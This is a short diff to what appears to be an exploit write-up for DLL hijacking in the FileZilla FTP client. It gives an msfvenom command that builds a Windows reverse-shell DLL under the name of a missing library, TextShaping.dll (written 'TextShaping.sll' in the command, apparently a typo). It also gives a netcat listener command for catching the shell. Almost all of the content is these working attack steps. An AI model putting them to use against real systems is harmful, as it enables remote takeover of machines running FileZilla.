@@ -19,13 +19,21 @@ FileZilla is a free and open-source, cross-platform FTP application, consisting 
 DLL Library named TextShaping.dll is not present at the FileZilla folder, this file can be loaded with the app.
 Make malicious .dll file via msfvenom
 
+```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=7777 -f dll -o TextShaping.sll
+```
 
 place at the destination folder
 
 start listener via nc
 
+```
 nc -lvp 7777
+```
 
+Local Folder
+
+```
 C:\PRogram Files\FileZilla FTP Client>
 C:\PRogram Files\FileZilla FTP Client>
+```
